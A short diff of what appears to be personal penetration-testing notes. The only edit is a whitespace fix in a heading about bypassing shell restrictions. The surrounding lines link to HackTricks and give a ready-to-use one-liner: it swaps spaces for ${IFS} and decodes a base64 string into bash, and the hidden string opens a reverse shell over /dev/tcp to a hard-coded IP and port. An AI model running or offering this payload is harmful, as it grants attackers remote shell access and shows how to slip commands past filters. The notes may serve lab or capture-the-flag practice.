@@ -15,7 +15,7 @@ gzip -d file.gz<br>
 **bypass-bash-restrictions**<br>
 https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions<br>
 
-**Bypass shell restriction using {IFS} and Base 64 encoding **
+**Bypass shell restriction using {IFS} and Base 64 encoding**
 
 ```echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;```<br>
 it means the highlighted part below is base64 encoded to bypass shell restriction<br>
